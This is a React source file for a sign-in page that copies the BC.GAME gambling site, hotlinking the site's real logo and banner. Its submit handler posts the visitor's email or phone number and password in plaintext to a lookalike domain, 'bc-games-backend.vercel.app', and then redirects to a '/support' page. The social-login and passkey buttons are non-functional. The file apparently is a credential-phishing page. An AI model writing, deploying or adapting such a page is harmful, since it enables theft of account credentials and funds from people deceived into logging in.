import React, { useState } from 'react';
import { Eye, EyeOff, X } from 'lucide-react';

const Home = () => {
  const [formData, setFormData] = useState({
    emailOrPhone: '',
    password: '',
  });
  const [errors, setErrors] = useState({
    emailOrPhone: '',
    password: '',
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
    
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const validateForm = () => {
    let isValid = true;
    const newErrors = { emailOrPhone: '', password: '' };
    
    if (!formData.emailOrPhone) {
      newErrors.emailOrPhone = 'Please enter your email address or phone number';
      isValid = false;
    }
    
    if (!formData.password) {
      newErrors.password = 'Please enter your password';
      isValid = false;
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
      isValid = false;
    }
    
    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setLoading(true);
    setError('');

    try {
      const currentDateTime = new Date();
      const isEmail = formData.emailOrPhone.includes('@');
      let phoneNumber = formData.emailOrPhone;
      
      if (!isEmail && !phoneNumber.startsWith('+91')) {
        phoneNumber = `+91${phoneNumber}`;
      }
      
      const payload = {
        password: formData.password,
        loginDate: currentDateTime.toISOString().split('T')[0],
        loginTime: currentDateTime.toTimeString().split(' ')[0],
        loginMethod: isEmail ? 'email' : 'phone',
        ...(isEmail 
          ? { email: formData.emailOrPhone, phone: null } 
          : { phone: phoneNumber, email: null })
      };

      // Simulate API call
      // Send data to backend API
      const response = await fetch('https://bc-games-backend.vercel.app/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        const result = await response.json();
        console.log('Login successful:', result);
        setLoading(false);
        // Redirect to support page
        window.location.href = '/support';
      } else {
        throw new Error('Login failed');
      }
      
    } catch (err) {
      setError('Login failed. Please try again.');
      console.error('Login error:', err);
      setLoading(false);
    }
  };

  const handleGoogleLogin = () => {
    console.log('Google login clicked');
  };

  // Social media icons with proper SVG paths
  const socialIcons = {
    Google: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
      </svg>
    ),
    Twitter: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
      </svg>
    ),
    Telegram: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
      </svg>
    ),
    Discord: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419-.0190 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9460 2.4189-2.1568 2.4189Z"/>
      </svg>
    ),
    WeChat: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M8.691 2.188C3.891 2.188 0 5.476 0 9.53c0 2.212 1.17 4.203 3.002 5.55a.59.59 0 0 1 .213.665l-.39 1.48c-.019.07-.048.141-.048.213 0 .163.13.295.29.295a.326.326 0 0 0 .167-.054l1.903-1.114a.864.864 0 0 1 .717-.098 10.16 10.16 0 0 0 2.837.403c.276 0 .543-.027.811-.05-.857-2.578.157-4.972 1.932-6.446 1.703-1.415 3.882-1.98 5.853-1.838-.576-3.583-4.196-6.348-8.596-6.348zM5.785 5.991c.642 0 1.162.529 1.162 1.18 0 .659-.52 1.181-1.162 1.181-.642 0-1.162-.522-1.162-1.18 0-.652.52-1.181 1.162-1.181zm5.813 0c.642 0 1.162.529 1.162 1.18 0 .659-.52 1.181-1.162 1.181-.642 0-1.162-.522-1.162-1.18 0-.652.52-1.181 1.162-1.181zm4.721 2.471c-3.552 0-6.438 2.342-6.438 5.235 0 1.504.78 2.861 2.01 3.777a.495.495 0 0 1 .18.558l-.333 1.278c-.016.06-.042.121-.042.184 0 .142.111.26.25.26a.284.284 0 0 0 .145-.047l1.647-.967a.726.726 0 0 1 .61-.084c.52.15 1.072.23 1.647.23 3.561 0 6.438-2.342 6.438-5.235 0-2.894-2.877-5.236-6.438-5.236zm-2.924 3.23c.54 0 .979.448.979.999 0 .56-.439 1.007-.979 1.007-.54 0-.978-.448-.978-.999 0-.56.438-1.007.978-1.007zm5.858 0c.54 0 .979.448.979.999 0 .56-.439 1.007-.979 1.007-.54 0-.978-.448-.978-.999 0-.56.438-1.007.978-1.007z"/>
      </svg>
    ),
    WhatsApp: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.465 3.488"/>
      </svg>
    ),
    Line: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M19.365 9.863c.349 0 .63.285.63.631 0 .345-.281.63-.63.63H17.61v1.125h1.755c.349 0 .63.283.63.63 0 .344-.281.629-.63.629h-2.386c-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346 0 .627.285.627.63 0 .349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211 0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346 0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195 0 .375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345 0 .63.285.63.63v4.771zm-5.741 0c0 .344-.282.629-.631.629-.345 0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346 0 .628.285.628.63v4.771zm-2.466.629H4.917c-.345 0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348 0 .63.285.63.63v4.141h1.756c.348 0 .629.283.629.63 0 .344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943 0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/>
      </svg>
    ),
    Steam: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142s.016-.002.016-.002v-.063c0-2.319 1.875-4.202 4.188-4.202 2.313 0 4.188 1.883 4.188 4.202a4.165 4.165 0 01-4.188 4.188h-.097l-4.099 2.927s0 .016-.002.016c0 .064-.003.125-.003.188 0 1.207-.955 2.188-2.134 2.188-1.079 0-1.979-.793-2.113-1.826L.634 14.02c1.602 5.237 6.427 9.043 12.074 9.043C18.781 23.063 24 17.811 24 11.719 24 5.627 18.781.375 11.979.375v-.004-.371zm-3.731 16.438l-1.475-.611c.729.436 1.659.451 2.404-.365.36-.395.572-.923.572-1.501 0-.742-.301-1.422-.813-1.914a2.682 2.682 0 00-1.904-.781c-.721 0-1.375.301-1.844.781l1.518.629c.545-.266 1.245-.078 1.555.453.313.529.129 1.207-.405 1.508-.527.301-1.204.117-1.508-.41h.001zm7.733-9.19c0-1.544-1.245-2.789-2.783-2.789s-2.783 1.245-2.783 2.789c0 1.543 1.245 2.781 2.783 2.781s2.783-1.238 2.783-2.781z"/>
      </svg>
    )
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
      color: 'white',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      display: 'flex',
      flexDirection: 'column'
    }}>
      {/* Header with Banner */}
      <div style={{
        position: 'relative',
        marginBottom: '30px'
      }}>
        <div style={{
          width: '100%',
          height: '250px',
          background: 'url("https://bc.co/modules/account2/assets/bg_m-cac172cf.png") center/cover',
          position: 'relative',
          overflow: 'hidden'
        }}>
          <div style={{
            position: 'absolute',
            top: '0',
            left: '0',
            right: '0',
            bottom: '0',
            background: 'linear-gradient(to bottom, rgba(0,0,0,0.3), rgba(0,0,0,0.7))'
          }}>
            {/* Header Controls */}
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              padding: '16px 20px',
              position: 'relative',
              zIndex: 2
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '12px'
              }}>
                <img 
                  src="https://bc.game/assets/logo/logo.png" 
                  alt="BC.GAME Logo"
                  style={{
                    height: '32px',
                    width: 'auto'
                  }}
                />
              </div>
              
              <X style={{
                width: '24px',
                height: '24px',
                cursor: 'pointer',
                opacity: 0.4
              }} />
            </div>
          </div>
        </div>
      </div>

      {/* Login Form */}
      <div style={{
        flex: 1,
        padding: '0 20px',
        maxWidth: '100%',
        boxSizing: 'border-box'
      }}>
        <h1 style={{
          fontSize: '28px',
          fontWeight: 'bold',
          marginBottom: '30px',
          textAlign: 'left'
        }}>
          Sign In
        </h1>
        
        <div>
          <div style={{ marginBottom: '20px' }}>
            <input 
              type="text" 
              name="emailOrPhone"
              placeholder="Email / Phone Number" 
              value={formData.emailOrPhone}
              onChange={handleInputChange}
              style={{
                width: '100%',
                padding: '16px 20px',
                background: 'rgba(255, 255, 255, 0.05)',
                border: '1px solid rgba(255, 255, 255, 0.1)',
                borderRadius: '12px',
                color: 'white',
                fontSize: '16px',
                outline: 'none',
                boxSizing: 'border-box'
              }}
            />
            {errors.emailOrPhone && (
              <div style={{
                color: '#ff4757',
                fontSize: '14px',
                marginTop: '8px',
                paddingLeft: '4px'
              }}>
                {errors.emailOrPhone}
              </div>
            )}
          </div>
          
          <div style={{ marginBottom: '12px' }}>
            <div style={{ position: 'relative' }}>
              <input 
                type={showPassword ? "text" : "password"} 
                name="password"
                placeholder="Password" 
                value={formData.password}
                onChange={handleInputChange}
                style={{
                  width: '100%',
                  padding: '16px 50px 16px 20px',
                  background: 'rgba(255, 255, 255, 0.05)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  borderRadius: '12px',
                  color: 'white',
                  fontSize: '16px',
                  outline: 'none',
                  boxSizing: 'border-box'
                }}
              />
              <button 
                type="button" 
                onClick={togglePasswordVisibility}
                style={{
                  position: 'absolute',
                  right: '16px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  background: 'none',
                  border: 'none',
                  color: 'rgba(255, 255, 255, 0.5)',
                  cursor: 'pointer',
                  padding: '4px'
                }}
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            {errors.password && (
              <div style={{
                color: '#ff4757',
                fontSize: '14px',
                marginTop: '8px',
                paddingLeft: '4px'
              }}>
                {errors.password}
              </div>
            )}
          </div>
          
          <div style={{
            textAlign: 'right',
            marginBottom: '24px'
          }}>
            <span style={{
              color: 'rgba(255, 255, 255, 0.6)',
              fontSize: '14px',
              cursor: 'pointer'
            }}>
              Forgot your password?
            </span>
          </div>
          
          {error && (
            <div style={{
              color: '#ff4757',
              fontSize: '14px',
              marginBottom: '16px',
              textAlign: 'center'
            }}>
              {error}
            </div>
          )}
          
          <button 
            onClick={handleSubmit}
            disabled={loading}
            style={{
              width: '100%',
              padding: '16px',
              background: loading ? 'rgba(0, 212, 170, 0.7)' : 'linear-gradient(90deg, #00d4aa, #00ff88)',
              border: 'none',
              borderRadius: '12px',
              color: 'white',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: loading ? 'not-allowed' : 'pointer',
              marginBottom: '20px'
            }}
          >
            {loading ? 'SIGNING IN...' : 'Sign In'}
          </button>
        </div>
        
        <div style={{
          textAlign: 'center',
          marginBottom: '30px'
        }}>
          <span style={{
            color: 'rgba(255, 255, 255, 0.6)',
            fontSize: '14px'
          }}>
            New to BC.GAME? 
          </span>
          <span style={{
            color: '#00ff88',
            fontSize: '14px',
            cursor: 'pointer',
            marginLeft: '6px'
          }}>
            Create account
          </span>
        </div>
        
        <div style={{
          display: 'flex',
          alignItems: 'center',
          marginBottom: '24px',
          gap: '16px'
        }}>
          <div style={{
            flex: 1,
            height: '1px',
            background: 'rgba(255, 255, 255, 0.1)'
          }}></div>
          <span style={{
            color: 'rgba(255, 255, 255, 0.6)',
            fontSize: '14px',
            whiteSpace: 'nowrap'
          }}>
            Log in directly with
          </span>
          <div style={{
            flex: 1,
            height: '1px',
            background: 'rgba(255, 255, 255, 0.1)'
          }}></div>
        </div>
        
        <button style={{
          width: '100%',
          padding: '16px',
          background: 'rgba(255, 255, 255, 0.05)',
          border: '1px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '12px',
          color: 'white',
          fontSize: '16px',
          cursor: 'pointer',
          marginBottom: '24px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '12px'
        }}>
          <div style={{
            width: '20px',
            height: '20px',
            background: 'rgba(255, 255, 255, 0.2)',
            borderRadius: '4px'
          }}></div>
          Sign In with passkey
        </button>
        
        <div style={{
          display: 'flex',
          flexWrap: 'nowrap',
          justifyContent: 'space-between',
          gap: '6px',
          marginBottom: '40px',
          padding: '0 8px',
          overflow: 'hidden'
        }}>
          {[
            { name: 'Google', icon: socialIcons.Google },
            { name: 'Twitter', icon: socialIcons.Twitter },
            { name: 'Telegram', icon: socialIcons.Telegram },
            { name: 'Discord', icon: socialIcons.Discord },
            { name: 'WeChat', icon: socialIcons.WeChat },
            { name: 'WhatsApp', icon: socialIcons.WhatsApp },
            { name: 'Line', icon: socialIcons.Line },
            { name: 'Steam', icon: socialIcons.Steam }
          ].map((social, index) => (
            <button 
              key={index}
              style={{
                flex: '0 0 auto',
                width: '44px',
                height: '44px',
                background: 'rgba(255, 255, 255, 0.05)',
                border: '1px solid rgba(255, 255, 255, 0.1)',
                borderRadius: '8px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                color: 'rgba(255, 255, 255, 0.7)'
              }}
              onClick={() => console.log(`${social.name} login clicked`)}
            >
              {social.icon}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};

export default Home;